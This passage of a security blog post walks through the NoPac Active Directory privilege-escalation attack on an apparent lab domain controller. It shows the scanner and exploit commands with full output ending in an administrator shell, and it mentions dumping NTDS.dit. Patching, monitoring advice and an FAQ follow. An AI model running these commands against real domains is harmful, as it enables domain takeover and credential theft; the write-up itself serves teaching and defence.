<h3 id="2-dot-enumerate-to-find-out-if-the-target-is-vulnerable-to-the-nopac-exploit">2. Enumerate to find out if the target is vulnerable to the NoPac Exploit:</h3>
<ul>
<li>Luckly the exploit we are using comes with a scanner, so this can be used to check if the host is vulnerable.







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%20noPac%20%20%f0%9f%8d%a3%20main%20%f0%9f%9b%a4%ef%b8%8f%20%20%c3%971%f0%9f%90%8d%20v3.12.6%20%202GiB/15GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2014:00:18%20zsh%20%e2%9c%96%20%20sudo%20python3%20scanner.py%20$domain/$user:$pass%20-dc-ip%20$box%20-use-ldap%0a%0a%0a%e2%96%88%e2%96%88%e2%96%88%20%20%20%20%e2%96%88%e2%96%88%20%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%20%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%20%20%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%20%20%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%0a%e2%96%88%e2%96%88%e2%96%88%e2%96%88%20%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%20%20%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%20%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%20%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%0a%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%20%20%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%20%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%0a%e2%96%88%e2%96%88%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%20%20%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%20%20%20%20%20%20%e2%96%88%e2%96%88%20%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%0a%e2%96%88%e2%96%88%20%20%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%20%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%20%20%e2%96%88%e2%96%88%20%20%20%20%20%20%e2%96%88%e2%96%88%20%20%20%e2%96%88%e2%96%88%20%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%0a%0a%0a%0a[*]%20Current%20ms-DS-MachineAccountQuota%20=%2010%0a[*]%20Got%20TGT%20with%20PAC%20from%2010.129.96.155.%20Ticket%20size%201470%0a[*]%20Got%20TGT%20from%2010.129.96.155.%20Ticket%20size%20721">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in noPac  üç£ main üõ§Ô∏è  √ó1üêç v3.12.6  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>üïô 14:00:18 zsh ‚úñ  sudo python3 scanner.py $domain/$user:$pass -dc-ip $box -use-ldap
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>‚ñà‚ñà‚ñà    ‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
</span></span><span style="display:flex;"><span>‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà
</span></span><span style="display:flex;"><span>‚ñà‚ñà ‚ñà‚ñà  ‚ñà‚ñà ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà
</span></span><span style="display:flex;"><span>‚ñà‚ñà  ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà
</span></span><span style="display:flex;"><span>‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà   ‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Current ms-DS-MachineAccountQuota <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT with PAC from 10.129.96.155. Ticket size <span style="color:#ae81ff">1470</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT from 10.129.96.155. Ticket size <span style="color:#ae81ff">721</span></span></span></code></pre></div>
    
</div>
</li>
</ul>
<h3 id="3-dot-execute-the-exploit">3. Execute the Exploit:</h3>
<ul>
<li>
<p>Run the NoPac exploit tool with your standard domain user credentials.</p>
</li>
<li>
<p>The tool will automatically perform the necessary steps to exploit both vulnerabilities.</p>
</li>
<li>
<p>Here&rsquo;s an example of what the output might look like when running the NoPac exploit:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%20noPac%20%20%f0%9f%8d%a3%20main%20%f0%9f%9b%a4%ef%b8%8f%20%20%c3%971%f0%9f%90%8d%20v3.12.6%20%202GiB/15GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2014:38:42%20zsh%20%e2%9d%af%20sudo%20python3%20noPac.py%20$domain/$user:$pass%20-dc-ip%20$box%20-dc-host%20resolute%20-shell%20--impersonate%20administrator%20-use-ldap%0a%0a%e2%96%88%e2%96%88%e2%96%88%20%20%20%20%e2%96%88%e2%96%88%20%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%20%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%20%20%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%20%20%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%0a%e2%96%88%e2%96%88%e2%96%88%e2%96%88%20%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%20%20%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%20%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%20%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%0a%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%20%20%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%20%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%0a%e2%96%88%e2%96%88%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%20%20%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%20%20%20%20%20%20%e2%96%88%e2%96%88%20%20%20%e2%96%88%e2%96%88%20%e2%96%88%e2%96%88%0a%e2%96%88%e2%96%88%20%20%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%20%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%20%20%e2%96%88%e2%96%88%20%20%20%20%20%20%e2%96%88%e2%96%88%20%20%20%e2%96%88%e2%96%88%20%20%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%e2%96%88%0a%0a[*]%20Current%20ms-DS-MachineAccountQuota%20=%2010%0a[*]%20Selected%20Target%20RESOLUTE.megabank.local%0a[*]%20will%20try%20to%20impersonate%20administrator%0a[*]%20Adding%20Computer%20Account%20%22WIN-LE7ODKFREMZ$%22%0a[*]%20MachineAccount%20%22WIN-LE7ODKFREMZ$%22%20password%20=%207N9FdTniA0C9%0a[*]%20Successfully%20added%20machine%20account%20WIN-LE7ODKFREMZ$%20with%20password%207N9FdTniA0C9.%0a[*]%20WIN-LE7ODKFREMZ$%20object%20=%20CN=WIN-LE7ODKFREMZ,CN=Computers,DC=megabank,DC=local%0a[*]%20WIN-LE7ODKFREMZ$%20sAMAccountName%20==%20RESOLUTE%0a[*]%20Saving%20a%20DC%27s%20ticket%20in%20RESOLUTE.ccache%0a[*]%20Reseting%20the%20machine%20account%20to%20WIN-LE7ODKFREMZ$%0a[*]%20Restored%20WIN-LE7ODKFREMZ$%20sAMAccountName%20to%20original%20value%0a[*]%20Using%20TGT%20from%20cache%0a[*]%20Impersonating%20administrator%0a[*]%20%20%20%20%20Requesting%20S4U2self%0a[*]%20Saving%20a%20user%27s%20ticket%20in%20administrator.ccache%0a[*]%20Rename%20ccache%20to%20administrator_RESOLUTE.megabank.local.ccache%0a[*]%20Attempting%20to%20del%20a%20computer%20with%20the%20name:%20WIN-LE7ODKFREMZ$%0a[-]%20Delete%20computer%20WIN-LE7ODKFREMZ$%20Failed!%20Maybe%20the%20current%20user%20does%20not%20have%20permission.%0a[*]%20Pls%20make%20sure%20your%20choice%20hostname%20and%20the%20-dc-ip%20are%20same%20machine%20!!%0a[*]%20Exploiting..%0a[!]%20Launching%20semi-interactive%20shell%20-%20Careful%20what%20you%20execute">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in noPac  üç£ main üõ§Ô∏è  √ó1üêç v3.12.6  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>üïô 14:38:42 zsh ‚ùØ sudo python3 noPac.py $domain/$user:$pass -dc-ip $box -dc-host resolute -shell --impersonate administrator -use-ldap
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>‚ñà‚ñà‚ñà    ‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
</span></span><span style="display:flex;"><span>‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà
</span></span><span style="display:flex;"><span>‚ñà‚ñà ‚ñà‚ñà  ‚ñà‚ñà ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà
</span></span><span style="display:flex;"><span>‚ñà‚ñà  ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà
</span></span><span style="display:flex;"><span>‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà   ‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Current ms-DS-MachineAccountQuota <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Selected Target RESOLUTE.megabank.local
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> will try to impersonate administrator
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Adding Computer Account <span style="color:#e6db74">&#34;WIN-LE7ODKFREMZ</span>$<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> MachineAccount <span style="color:#e6db74">&#34;WIN-LE7ODKFREMZ</span>$<span style="color:#e6db74">&#34;</span> password <span style="color:#f92672">=</span> 7N9FdTniA0C9
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully added machine account WIN-LE7ODKFREMZ$ with password 7N9FdTniA0C9.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WIN-LE7ODKFREMZ$ object <span style="color:#f92672">=</span> CN<span style="color:#f92672">=</span>WIN-LE7ODKFREMZ,CN<span style="color:#f92672">=</span>Computers,DC<span style="color:#f92672">=</span>megabank,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WIN-LE7ODKFREMZ$ sAMAccountName <span style="color:#f92672">==</span> RESOLUTE
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving a DC<span style="color:#e6db74">&#39;s ticket in RESOLUTE.ccache
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Reseting the machine account to WIN-LE7ODKFREMZ$
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Restored WIN-LE7ODKFREMZ$ sAMAccountName to original value
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Using TGT from cache
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Impersonating administrator
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*]     Requesting S4U2self
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Saving a user&#39;</span>s ticket in administrator.ccache
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Rename ccache to administrator_RESOLUTE.megabank.local.ccache
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attempting to del a computer with the name: WIN-LE7ODKFREMZ$
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Delete computer WIN-LE7ODKFREMZ$ Failed! Maybe the current user does not have permission.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Pls make sure your choice hostname and the -dc-ip are same machine !!
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploiting..
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Launching semi-interactive shell - Careful what you execute</span></span></code></pre></div>
    
</div>
</li>
</ul>
<h3 id="4-dot-verify-privilege-escalation">4. Verify Privilege Escalation:</h3>
<ul>
<li>Once the exploit completes, verify your new privileges using commands like <code>whoami /groups</code> or by attempting to access Domain Controller resources.</li>
</ul>
<!-- raw HTML omitted -->







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\Windows\system32&gt;whoami /groups
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>GROUP INFORMATION
</span></span><span style="display:flex;"><span>-----------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Group Name                             Type             SID          Attributes
</span></span><span style="display:flex;"><span>====================================== ================ ============ ==================================================
</span></span><span style="display:flex;"><span>BUILTIN\Administrators                 Alias            S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">32</span>-<span style="color:#ae81ff">544</span> Enabled by <span style="color:#66d9ef">default</span>, Enabled group, Group owner
</span></span><span style="display:flex;"><span>Everyone                               Well-known group S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">0</span>      <span style="color:#a6e22e">Mandatory</span> group, Enabled by <span style="color:#66d9ef">default</span>, Enabled group
</span></span><span style="display:flex;"><span>NT AUTHORITY\Authenticated Users       Well-known group S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">11</span>     <span style="color:#a6e22e">Mandatory</span> group, Enabled by <span style="color:#66d9ef">default</span>, Enabled group
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Mandatory</span> Label\System <span style="color:#a6e22e">Mandatory</span> Level Label            S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">16</span>-<span style="color:#ae81ff">16384</span></span></span></code></pre></div>
    
</div>
<h3 id="5-dot-post-exploitation">5. Post-Exploitation:</h3>
<ul>
<li>With Domain Admin privileges, you now have full control over the domain and can perform actions like dumping the <code>NTDS.dit</code> file or creating new domain admin accounts.</li>
<li>To see my approach to this see my walkthrough:
<ul>
<li><a href="https://bloodstiller.com/walkthroughs/resolute-box/">https://bloodstiller.com/walkthroughs/resolute-box/</a></li>
</ul>
</li>
</ul>
<h2 id="defending-against-nopac-attacks">Defending Against NoPac Attacks:</h2>
<p>Given the severity of the NoPac exploit, it&rsquo;s crucial for system administrators to take steps to mitigate the risks. Here are some key defensive measures:</p>
<ol>
<li>
<p><strong>Apply Security Updates</strong>:</p>
<ul>
<li>Immediately apply the patches released by Microsoft for CVE-2021-42278 and CVE-2021-42287.</li>
<li>Regularly check for and apply new security updates.</li>
</ul>
</li>
<li>
<p><strong>Implement Least Privilege</strong>:</p>
<ul>
<li>Restrict user permissions to the minimum necessary for their roles.</li>
<li>Regularly audit and review user and computer account permissions.</li>
</ul>
</li>
<li>
<p><strong>Monitor Active Directory</strong>:</p>
<ul>
<li>Implement robust logging and monitoring for Active Directory events.</li>
<li>Pay special attention to computer account name changes and unusual service ticket requests.</li>
</ul>
</li>
<li>
<p><strong>Use Advanced Threat Detection</strong>:</p>
<ul>
<li>Employ security information and event management (SIEM) tools to detect suspicious activities.</li>
<li>Consider using Active Directory-specific security tools that can detect exploitation attempts.</li>
</ul>
</li>
<li>
<p><strong>Conduct Regular Security Assessments</strong>:</p>
<ul>
<li>Perform frequent vulnerability scans and penetration tests.</li>
<li>Use tools like PingCastle to assess the overall security posture of your Active Directory environment.</li>
</ul>
</li>
<li>
<p><strong>Implement Network Segmentation</strong>:</p>
<ul>
<li>Separate critical assets and limit lateral movement within the network.</li>
<li>Use firewalls and access controls to restrict unnecessary communication between network segments.</li>
</ul>
</li>
<li>
<p><strong>Educate and Train</strong>:</p>
<ul>
<li>Ensure IT staff are aware of the latest threats and mitigation strategies.</li>
<li>Conduct regular security awareness training for all users.</li>
</ul>
</li>
</ol>
<p>Remember, no single measure can provide complete protection against sophisticated attacks like NoPac. A defense-in-depth strategy, combining multiple layers of security controls, is crucial for comprehensive protection.</p>
<h2 id="conclusion">Conclusion:</h2>
<p>By leveraging two seemingly minor vulnerabilities, attackers can potentially compromise an entire domain with alarming ease. This underscores the critical importance of prompt patching, continuous monitoring, and a proactive approach to security.</p>
<h2 id="further-reading">Further Reading:</h2>
<p>For those interested in diving deeper into this topic, I recommend exploring:</p>
<ul>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278">Microsoft&rsquo;s Security Update Guide for CVE-2021-42278</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287">Microsoft&rsquo;s Security Update Guide for CVE-2021-42287</a></li>
<li><a href="https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware">https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware</a></li>
<li><a href="https://attack.mitre.org/">MITRE ATT&amp;CK framework</a>, particularly the entries on Initial Access and Privilege Escalation techniques</li>
</ul>
<h2 id="frequently-asked-questions">Frequently Asked Questions:</h2>
<h3 id="q-how-quickly-should-organizations-patch-for-nopac-vulnerabilities">Q: How quickly should organizations patch for NoPac vulnerabilities?</h3>
<p>A: Organizations should treat these vulnerabilities as critical and apply patches as soon as possible, ideally within days of their release.</p>
<h3 id="q-can-nopac-be-exploited-remotely">Q: Can NoPac be exploited remotely?</h3>
<p>A: While initial access to the domain is required, once an attacker has standard domain user credentials, they can potentially exploit NoPac remotely.</p>
<h3 id="q-are-there-any-signs-that-might-indicate-a-nopac-attack-has-occurred">Q: Are there any signs that might indicate a NoPac attack has occurred?</h3>
<p>A: Signs may include unexpected computer account name changes, unusual service ticket requests. However, skilled attackers will attempt to cover their tracks.</p>
<h3 id="q-can-nopac-be-mitigated-without-applying-patches">Q: Can NoPac be mitigated without applying patches?</h3>
<p>A: While patching is the most effective mitigation, other measures like restricting user permissions and monitoring Active Directory events can help reduce the risk. However, these should be considered temporary measures until patching can be completed.</p>
<h3 id="q-how-does-nopac-compare-to-other-active-directory-exploits">Q: How does NoPac compare to other Active Directory exploits?</h3>
<p>A: NoPac is particularly dangerous due to its relative simplicity and the potential for rapid privilege escalation. Unlike some exploits that require specific misconfigurations, NoPac could potentially affect any unpatched Active Directory environment.</p>

            
        </div>
    </article>

        </main>

        <footer class="footer">
    <div class="footer-left">
        <ul class="social">
            
                <li>All Rights Reserved ¬Æ.</li>
            

            
                <li>Bloodstiller</li>
            

            
                
            
                
            
                
                    <li>
                        
                            <a href="https://github.com/bloodstiller" target="_blank">
                                <i class="bi-github"></i>
                            </a>
                        

                    </li>
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
        </ul>
    </div>

    <div class="footer-right">
        <ul class="control status clearfix">
            
                <li>
                    
                        Word Count:
                        1767
                    
                </li>
            


            
                <li>en</li>
            

            

            

            
                <li>
                    
                        Last modified: &nbsp;
                        <time>
                            Oct 21 2024 00:00:00
                        </time>
                    
                </li>
            

            
        </ul>
    </div>
</footer>

    </body>

    






















    
        
        <script
            type="text/javascript"
            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
    















<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />




</html>
